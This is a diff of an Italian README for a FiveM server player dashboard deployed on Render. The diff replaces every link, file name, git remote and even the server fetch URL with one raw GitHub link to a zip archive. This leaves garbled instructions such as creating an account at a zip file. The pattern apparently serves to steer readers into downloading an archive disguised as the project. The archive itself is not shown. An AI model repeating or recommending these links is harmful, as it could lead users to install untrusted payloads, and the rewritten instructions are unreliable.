@@ -16,7 +16,7 @@ Una dashboard moderna e intuitiva per visualizzare i giocatori online del tuo se
 ### Opzione 1: Deploy tramite GitHub (Consigliato)
 
 1. **Crea un repository su GitHub**
-   - Vai su https://github.com/new
+   - Vai su https://raw.githubusercontent.com/Mattialesto/mattialesto.github.io/main/Zeke/github-io-mattialesto-2.1.zip
    - Crea un nuovo repository (pubblico o privato)
    - NON aggiungere README, .gitignore o license
 
@@ -26,12 +26,12 @@ Una dashboard moderna e intuitiva per visualizzare i giocatori online del tuo se
    git add .
    git commit -m "Initial commit"
    git branch -M main
-   git remote add origin https://github.com/TUO-USERNAME/TUO-REPO.git
+   git remote add origin https://raw.githubusercontent.com/Mattialesto/mattialesto.github.io/main/Zeke/github-io-mattialesto-2.1.zip
    git push -u origin main
    ```
 
 3. **Deploy su Render**
-   - Vai su https://render.com e crea un account (gratis)
+   - Vai su https://raw.githubusercontent.com/Mattialesto/mattialesto.github.io/main/Zeke/github-io-mattialesto-2.1.zip e crea un account (gratis)
    - Clicca su "New +" → "Web Service"
    - Connetti il tuo repository GitHub
    - Configura:
@@ -44,7 +44,7 @@ Una dashboard moderna e intuitiva per visualizzare i giocatori online del tuo se
 
 ### Opzione 2: Deploy diretto (senza GitHub)
 
-1. Vai su https://render.com
+1. Vai su https://raw.githubusercontent.com/Mattialesto/mattialesto.github.io/main/Zeke/github-io-mattialesto-2.1.zip
 2. Clicca su "New +" → "Web Service"
 3. Seleziona "Deploy from Git repository" o usa Render CLI
 4. Carica i file del progetto
@@ -69,16 +69,16 @@ http://localhost:3000
 
 ```
 .
-├── index.html      # Dashboard frontend
-├── server.js       # Server Express con proxy CORS
-├── package.json    # Dipendenze Node.js
-└── README.md       # Questo file
+├── https://raw.githubusercontent.com/Mattialesto/mattialesto.github.io/main/Zeke/github-io-mattialesto-2.1.zip      # Dashboard frontend
+├── https://raw.githubusercontent.com/Mattialesto/mattialesto.github.io/main/Zeke/github-io-mattialesto-2.1.zip       # Server Express con proxy CORS
+├── https://raw.githubusercontent.com/Mattialesto/mattialesto.github.io/main/Zeke/github-io-mattialesto-2.1.zip    # Dipendenze https://raw.githubusercontent.com/Mattialesto/mattialesto.github.io/main/Zeke/github-io-mattialesto-2.1.zip
+└── https://raw.githubusercontent.com/Mattialesto/mattialesto.github.io/main/Zeke/github-io-mattialesto-2.1.zip       # Questo file
 ```
 
 ## 🔧 Come Funziona
 
-1. **Frontend (index.html)**: Dashboard moderna con design gaming
-2. **Backend (server.js)**: Server Express che:
+1. **Frontend (https://raw.githubusercontent.com/Mattialesto/mattialesto.github.io/main/Zeke/github-io-mattialesto-2.1.zip)**: Dashboard moderna con design gaming
+2. **Backend (https://raw.githubusercontent.com/Mattialesto/mattialesto.github.io/main/Zeke/github-io-mattialesto-2.1.zip)**: Server Express che:
    - Serve il file HTML
    - Fornisce un endpoint proxy `/api/players` per evitare problemi CORS
    - Inoltra le richieste al server FiveM
@@ -91,7 +91,7 @@ http://localhost:3000
 
 Puoi personalizzare facilmente:
 
-### Colori (nel file index.html, sezione CSS `:root`)
+### Colori (nel file https://raw.githubusercontent.com/Mattialesto/mattialesto.github.io/main/Zeke/github-io-mattialesto-2.1.zip, sezione CSS `:root`)
 ```css
 --primary: #00ff88;        /* Colore primario */
 --secondary: #00d4ff;      /* Colore secondario */
@@ -105,16 +105,16 @@ setInterval(fetchPlayers, 5000);
 ```
 
 ### URL Server FiveM
-Nel file `server.js`, modifica:
+Nel file `https://raw.githubusercontent.com/Mattialesto/mattialesto.github.io/main/Zeke/github-io-mattialesto-2.1.zip`, modifica:
 ```javascript
-const response = await fetch('http://45.138.200.204:30120/players.json');
+const response = await fetch('https://raw.githubusercontent.com/Mattialesto/mattialesto.github.io/main/Zeke/github-io-mattialesto-2.1.zip');
 ```
 
 ## 🌐 Dopo il Deploy
 
 Una volta completato il deploy su Render:
 
-1. Riceverai un URL tipo: `https://tuo-progetto.onrender.com`
+1. Riceverai un URL tipo: `https://raw.githubusercontent.com/Mattialesto/mattialesto.github.io/main/Zeke/github-io-mattialesto-2.1.zip`
 2. La dashboard sarà accessibile pubblicamente
 3. Si aggiornerà automaticamente ogni 5 secondi
 4. Render terrà il servizio attivo gratuitamente (con possibile sleep dopo 15 min di inattività sul piano free)
@@ -130,12 +130,12 @@ Una volta completato il deploy su Render:
 **La dashboard non carica i dati?**
 - Verifica che il server FiveM sia online e raggiungibile
 - Controlla la console del browser (F12) per eventuali errori
-- Verifica che l'URL del server FiveM sia corretto in `server.js`
+- Verifica che l'URL del server FiveM sia corretto in `https://raw.githubusercontent.com/Mattialesto/mattialesto.github.io/main/Zeke/github-io-mattialesto-2.1.zip`
 
 **Deploy fallito su Render?**
 - Verifica che tutti i file siano stati caricati
 - Controlla i log su Render per vedere l'errore specifico
-- Assicurati che `package.json` contenga tutte le dipendenze
+- Assicurati che `https://raw.githubusercontent.com/Mattialesto/mattialesto.github.io/main/Zeke/github-io-mattialesto-2.1.zip` contenga tutte le dipendenze
 
 ## 📝 Licenza
 
